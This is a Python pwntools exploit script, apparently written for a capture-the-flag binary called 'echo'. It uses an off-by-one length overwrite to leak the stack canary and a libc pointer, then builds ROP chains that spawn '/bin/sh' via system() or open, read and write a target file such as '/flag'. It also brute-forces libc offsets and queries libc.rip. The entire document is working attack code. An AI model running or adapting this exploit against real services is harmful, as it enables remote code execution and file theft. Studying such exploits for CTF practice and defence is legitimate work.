#!/usr/bin/env python3
import os
import json
import time
import urllib.request

os.environ.setdefault('XDG_CACHE_HOME', '/tmp')

from pwn import *

context.binary = elf = ELF('./echo', checksec=False)
context.arch = 'amd64'
context.log_level = 'info'
if args.QUIET:
    context.log_level = 'error'

BUF = 64
OFF_MAIN_RET_IN_LIBC_DEFAULT = 0x29F68
OFF_POP_RDI_DEFAULT = 0x2A405
OFF_POP_RSI_DEFAULT = 0x2BD69
OFF_POP_RDX_DEFAULT = 0xBE0E2
OFF_RET_DEFAULT = 0x2846B
OFF_POP_RSP_DEFAULT = 0x28618


def start():
    if args.REMOTE:
        host = args.HOST or '127.0.0.1'
        port = int(args.PORT or 1337)
        return remote(host, port)
    return process(elf.path, stdin=PIPE, stdout=PIPE, stderr=PIPE)


def recv_prompt(io):
    io.recvuntil(b'echo ')


def set_len(io, new_len):
    # Off-by-one write on len byte (local_18). Keep stream synced on next prompt.
    io.send(b'A' * BUF + bytes([new_len]))
    out = io.recvuntil(b'echo ', timeout=1) or b''
    return out[:-5] if out.endswith(b'echo ') else out


def send_exact(io, payload):
    # Payload must be exactly len+1 bytes and sent without '\n'.
    # Read full echoed output until next prompt (not recvline), otherwise
    # leaked bytes containing '\\n' truncate the capture.
    io.send(payload)
    out = io.recvuntil(b'echo ', timeout=1) or b''
    return out[:-5] if out.endswith(b'echo ') else out


def leak_canary(io):
    # Write 73 bytes to overwrite canary[0] and leak canary[1:8].
    set_len(io, 72)
    payload = b'B' * 64 + b'@' + b'B' * 7 + b'Z'
    out = send_exact(io, payload)

    i = out.find(payload)
    if i < 0 or len(out) < i + len(payload) + 7:
        raise RuntimeError('Failed to leak canary')

    tail = out[i + len(payload): -1]
    canary = b'\x00' + tail[:7]
    saved_rbp = u64(tail[7:13].ljust(8, b'\x00')) if len(tail) >= 8 else 0
    log.success(f'canary = {canary.hex()}')
    return canary, saved_rbp


def leak_libc_ret(io):
    # 120-byte write reaches main saved rbp (offset 112..119) and leaks
    # main saved rip at offset 120, which points into libc.
    set_len(io, 119)
    payload = (
        b'C' * 64 +
        b'@' +
        b'D' * 7 +
        b'Q' * 8 +
        b'R' * 8 +
        b'S' * 8 +
        b'T' * 8 +
        b'U' * 8 +
        b'V' * 8
    )
    out = send_exact(io, payload)

    i = out.find(payload)
    if i < 0:
        raise RuntimeError('Failed to leak libc return pointer')

    leak = u64(out[i + len(payload): -1].ljust(8, b'\x00'))
    log.success(f'main return (libc) = {hex(leak)}')
    return leak

def leak_at_pos(io, pos):
    if pos < 1 or pos > 255:
        raise RuntimeError('position must be in [1,255]')
    set_len(io, pos - 1)
    marker = b'MK' + bytes([pos & 0xff]) + b'R'
    if pos >= 72:
        body_len = pos - 72 - len(marker)
        if body_len < 0:
            body_len = 0
        payload = b'B' * 64 + b'@' + b'B' * 7 + b'C' * body_len + marker
        if len(payload) < pos:
            payload += b'D' * (pos - len(payload))
        payload = payload[:pos]
    else:
        pad = b'B' * max(0, pos - len(marker))
        payload = (pad + marker)[:pos]
    out = send_exact(io, payload)
    i = out.rfind(marker)
    if i < 0:
        raise RuntimeError(f'failed to find marker at pos {pos}')
    tail = out[i + len(marker):]
    first_line = tail.split(b'\n', 1)[0]
    return u64(first_line[:8].ljust(8, b'\x00')), tail


def exploit():
    libc_path = args.LIBC or '/usr/lib/x86_64-linux-gnu/libc.so.6'
    libc = ELF(libc_path, checksec=False)

    if args.STACK_DUMP:
        io = start()
        try:
            recv_prompt(io)
            n = int(args.DUMP_LEN, 0) if args.DUMP_LEN else 120
            if n < 1 or n > 254:
                raise RuntimeError('DUMP_LEN must be in [1,254]')
            set_len(io, n - 1)
            marker = b'M' * 64 + b'@' + b'N' * 7
            payload = marker + b'P' * max(0, n - len(marker))
            out = send_exact(io, payload)
            i = out.find(payload)
            tail = out[i + len(payload): -1] if i >= 0 else out[:-1]
            print(f'DUMP_TOTAL={len(out)} TAIL_LEN={len(tail)}')
            print(tail.hex())
            return
        finally:
            io.close()

    if args.PROBE_POS:
        io = start()
        try:
            recv_prompt(io)
            pos = int(args.PROBE_POS, 0)
            if pos < 1 or pos > 255:
                raise RuntimeError('PROBE_POS must be in [1,255]')
            set_len(io, pos - 1)
            payload = b'B' * pos
            io.send(payload)
            data = io.recvuntil(b'echo ', timeout=1) or b''
            if data.endswith(b'echo '):
                data = data[:-5]
            i = data.rfind(payload)
            tail = data[i + len(payload):] if i >= 0 else data
            print(tail.hex())
            return
        finally:
            io.close()

    if args.PROBE_RANGE:
        start_pos = int(args.PROBE_START, 0) if args.PROBE_START else 112
        end_pos = int(args.PROBE_END, 0) if args.PROBE_END else 180
        io = start()
        try:
            recv_prompt(io)  # consume initial prompt once
            for pos in range(start_pos, end_pos + 1):
                try:
                    if pos < 1 or pos > 255:
                        print(f'{pos}:ERR')
                        continue
                    # We are already at input state (prompt consumed), so send directly.
                    io.send(b'A' * BUF + bytes([pos - 1]))
                    _ = io.recvuntil(b'echo ', timeout=1) or b''
                    payload = b'B' * pos
                    io.send(payload)
                    data = io.recvuntil(b'echo ', timeout=1) or b''
                    if data.endswith(b'echo '):
                        data = data[:-5]
                    i = data.rfind(payload)
                    tail = data[i + len(payload):] if i >= 0 else data
                    print(f'{pos}:{tail.hex()}')
                except Exception as e:
                    print(f'{pos}:ERR:{e}')
                    break
        finally:
            io.close()
        return

    if args.LEAK_LIBC:
        io = start()
        try:
            recv_prompt(io)
            leak_canary(io)
            libc_ret = leak_libc_ret(io)
            print(f'LEAK_LIBC_RET={hex(libc_ret)}')
            if args.MAIN_RET_OFF:
                off = int(args.MAIN_RET_OFF, 0)
                print(f'LEAK_LIBC_BASE={hex(libc_ret - off)}')
            if args.FIND_LIBC:
                if args.MAIN_RET_OFF:
                    off = int(args.MAIN_RET_OFF, 0)
                    offs = [off]
                else:
                    # Common family seen on this challenge style.
                    offs = [x + 0x1ca for x in range(0x20000, 0x41000, 0x1000)]

                for off in offs:
                    payload = json.dumps({'symbols': {'__libc_start_main_ret': hex(off)}}).encode()
                    for _ in range(5):
                        try:
                            req = urllib.request.Request(
                                'https://libc.rip/api/find',
                                data=payload,
                                headers={'Content-Type': 'application/json'},
                            )
                            with urllib.request.urlopen(req, timeout=8) as f:
                                arr = json.loads(f.read().decode())
                            if arr:
                                print(f'LIBC_MATCH_OFF={hex(off)} COUNT={len(arr)}')
                                for idx, cand in enumerate(arr[:30]):
                                    sy = cand.get('symbols', {})
                                    print(
                                        f'  [{idx}] {cand.get("id")} '
                                        f'system={sy.get("system")} '
                                        f'str_bin_sh={sy.get("str_bin_sh")} '
                                        f'read={sy.get("read")} '
                                        f'write={sy.get("write")}'
                                    )
                            break
                        except Exception:
                            time.sleep(1)
            return
        finally:
            io.close()

    if args.LEAK3:
        io = start()
        try:
            recv_prompt(io)
            canary, _ = leak_canary(io)
            main_ret = leak_libc_ret(io)
            print(f'LEAK_CANARY={canary.hex()}')
            print(f'LEAK_MAIN_RET={hex(main_ret)}')
            pos_list = args.LEAK_POS or '120,128,136'
            positions = [int(x.strip(), 0) for x in pos_list.split(',') if x.strip()]
            for p in positions:
                try:
                    v, raw = leak_at_pos(io, p)
                    print(f'LEAK_POS_{p}={hex(v)} RAW={raw[:16].hex()}')
                except Exception as e:
                    print(f'LEAK_POS_{p}=ERR:{e}')
            return
        finally:
            io.close()

    def run_once(off_main_ret, cmd=None):
        io = start()
        try:
            recv_prompt(io)
            canary, _saved_rbp = leak_canary(io)
            libc_ret = leak_libc_ret(io)
            libc.address = libc_ret - off_main_ret
            log.success(f'libc base = {hex(libc.address)}')

            # Gadget offsets for glibc used by this challenge (override via args if needed).
            pop_rdi = libc.address + int(args.POP_RDI_OFF, 0) if args.POP_RDI_OFF else libc.address + OFF_POP_RDI_DEFAULT
            pop_rsi = libc.address + int(args.POP_RSI_OFF, 0) if args.POP_RSI_OFF else libc.address + OFF_POP_RSI_DEFAULT
            pop_rdx = libc.address + int(args.POP_RDX_OFF, 0) if args.POP_RDX_OFF else libc.address + OFF_POP_RDX_DEFAULT
            ret = libc.address + int(args.RET_OFF, 0) if args.RET_OFF else libc.address + OFF_RET_DEFAULT
            log.info(f'pop_rdi = {hex(pop_rdi)}')
            log.info(f'pop_rsi = {hex(pop_rsi)}')
            log.info(f'pop_rdx = {hex(pop_rdx)}')
            log.info(f'ret     = {hex(ret)}')

            read_addr = libc.symbols['read']
            write_addr = libc.symbols['write']
            open_addr = libc.symbols['open']
            system_addr = libc.symbols['system']
            exit_addr = libc.symbols['exit']
            bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

            if args.READ_OFF:
                read_addr = libc.address + int(args.READ_OFF, 0)
            if args.WRITE_OFF:
                write_addr = libc.address + int(args.WRITE_OFF, 0)
            if args.OPEN_OFF:
                open_addr = libc.address + int(args.OPEN_OFF, 0)
            if args.SYSTEM_OFF:
                system_addr = libc.address + int(args.SYSTEM_OFF, 0)
            if args.EXIT_OFF:
                exit_addr = libc.address + int(args.EXIT_OFF, 0)
            if args.BINSH_OFF:
                bin_sh_addr = libc.address + int(args.BINSH_OFF, 0)

            if args.WRITE_TEST:
                test_addr = bin_sh_addr
                test_len = int(args.WRITE_LEN, 0) if args.WRITE_LEN else 0x20
                if args.WRITE_ADDR:
                    test_addr = libc.address + int(args.WRITE_ADDR, 0)
                chain = flat(
                    ret,
                    pop_rdi, 1,
                    pop_rsi, test_addr,
                    pop_rdx, test_len,
                    write_addr,
                    exit_addr
                )
            elif args.ORW:
                pop_rsp = libc.address + int(args.POP_RSP_OFF, 0) if args.POP_RSP_OFF else libc.address + OFF_POP_RSP_DEFAULT
                stage2_base = libc.bss(0x900)
                path_addr = stage2_base + 0x180
                file_buf = stage2_base + 0x200

                # Stage 1 (short): read stage2 into libc .bss then pivot rsp there.
                chain = flat(
                    ret,
                    pop_rdi, 0,
                    pop_rsi, stage2_base,
                    pop_rdx, 0x300,
                    read_addr,
                    pop_rsp, stage2_base
                )
            else:
                log.info(f'/bin/sh = {hex(bin_sh_addr)}')
                log.info(f'system  = {hex(system_addr)}')
                chain = flat(ret, pop_rdi, bin_sh_addr, system_addr)
            payload = b'A' * 64 + b'@' + b'B' * 7 + canary + b'C' * 8 + chain

            if len(payload) > 255:
                raise RuntimeError('ROP payload too long for uint8 length')
            if b'\n' in payload:
                raise RuntimeError('Final payload contains newline byte; cannot inject reliably')

            set_len(io, len(payload) - 1)
            send_exact(io, payload)

            # Empty line exits echo() loop and returns into our ROP chain.
            io.send(b'\n')

            if args.WRITE_TEST:
                return io.recvrepeat(1.5)

            if args.ORW:
                target = args.TARGET or '/flag'
                stage2 = flat(
                    pop_rdi, path_addr,
                    pop_rsi, 0,
                    open_addr
                )
                for fd in range(3, 9):
                    stage2 += flat(
                        pop_rdi, fd,
                        pop_rsi, file_buf,
                        pop_rdx, 0x200,
                        read_addr,
                        pop_rdi, 1,
                        pop_rsi, file_buf,
                        pop_rdx, 0x200,
                        write_addr
                    )
                stage2 += flat(exit_addr)
                stage2 = stage2.ljust(0x180, b'A')
                stage2 += target.encode() + b'\x00'
                if b'\n' in stage2:
                    log.warning('stage2 contains newline bytes (ok for read-stage)')
                io.send(stage2)
                out = io.recvrepeat(1.5)
                return out

            if cmd:
                io.sendline(cmd.encode())
                out = io.recvrepeat(1.5)
                return out

            io.interactive()
            return b''
        finally:
            io.close()

    if args.AUTO_OFF:
        marker = '___OK___'
        cmd = args.CMD or f'echo {marker}; id'
        for page in range(0x20000, 0x41000, 0x1000):
            off = page + 0x1ca
            log.info(f'trying MAIN_RET_OFF={hex(off)}')
            try:
                out = run_once(off, cmd=cmd)
            except Exception as e:
                log.warning(f'offset {hex(off)} failed: {e}')
                continue
            if out:
                text = out.decode(errors='ignore')
                print(text, end='')
                if args.ORW or args.WRITE_TEST:
                    log.success(f'valid MAIN_RET_OFF={hex(off)}')
                    return
                if marker in text or 'uid=' in text or 'flag{' in text.lower():
                    log.success(f'valid MAIN_RET_OFF={hex(off)}')
                    return
        raise RuntimeError('AUTO_OFF scan failed')

    off_main_ret = int(args.MAIN_RET_OFF, 0) if args.MAIN_RET_OFF else OFF_MAIN_RET_IN_LIBC_DEFAULT
    out = run_once(off_main_ret, cmd=args.CMD if args.CMD else None)
    if (args.CMD or args.ORW or args.WRITE_TEST) and out:
        print(out.decode(errors='ignore'), end='')


if __name__ == '__main__':
    exploit()
